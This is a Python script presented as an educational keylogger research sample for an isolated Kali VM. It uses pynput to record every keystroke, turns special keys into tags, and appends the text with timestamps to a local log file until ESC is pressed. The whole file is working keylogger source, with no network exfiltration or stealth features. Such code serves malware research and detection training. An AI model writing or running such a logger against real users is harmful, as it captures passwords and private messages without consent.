#!/usr/bin/env python3
"""
Keylogger Research Sample — Educational Use Only
Project: Keylogger Malware Research Lab
Author: Harshil Chheda
Purpose: Controlled research artifact for red+blue team analysis
Environment: Isolated Kali Linux VM only — never run on live systems
"""

from pynput import keyboard
from datetime import datetime
import os

# ── Config ──────────────────────────────────────────────
LOG_FILE = os.path.join(os.path.dirname(__file__), "logs", "keylog.txt")
FLUSH_INTERVAL = 10  # write to disk every N keystrokes
# ────────────────────────────────────────────────────────

buffer = []
keystroke_count = 0

def format_key(key):
    """Convert raw pynput key objects to readable strings."""
    try:
        # Regular character keys (a, b, 1, 2 ...)
        return key.char
    except AttributeError:
        # Special keys (space, enter, backspace ...)
        special = {
            keyboard.Key.space: " ",
            keyboard.Key.enter: "\n[ENTER]\n",
            keyboard.Key.backspace: "[BKSP]",
            keyboard.Key.tab: "[TAB]",
            keyboard.Key.caps_lock: "[CAPS]",
            keyboard.Key.ctrl_l: "[CTRL]",
            keyboard.Key.ctrl_r: "[CTRL]",
            keyboard.Key.alt_l: "[ALT]",
            keyboard.Key.alt_r: "[ALT]",
            keyboard.Key.shift: "[SHIFT]",
            keyboard.Key.esc: "[ESC]",
        }
        return special.get(key, f"[{key.name.upper()}]")

def flush_buffer():
    """Write buffered keystrokes to log file with timestamp."""
    global buffer
    if not buffer:
        return
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"\n[{timestamp}]\n")
        f.write("".join(buffer))
    buffer = []

def on_press(key):
    global keystroke_count, buffer

    # Stop listener on ESC — clean exit for research use
    if key == keyboard.Key.esc:
        flush_buffer()
        print("\n[*] ESC detected — keylogger stopped. Log saved.")
        return False  # stops the listener

    char = format_key(key)
    buffer.append(char)
    keystroke_count += 1

    # Flush to disk every FLUSH_INTERVAL keystrokes
    if keystroke_count % FLUSH_INTERVAL == 0:
        flush_buffer()

# ── Entry point ─────────────────────────────────────────
print("[*] Keylogger started — press ESC to stop")
print(f"[*] Logging to: {LOG_FILE}")

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
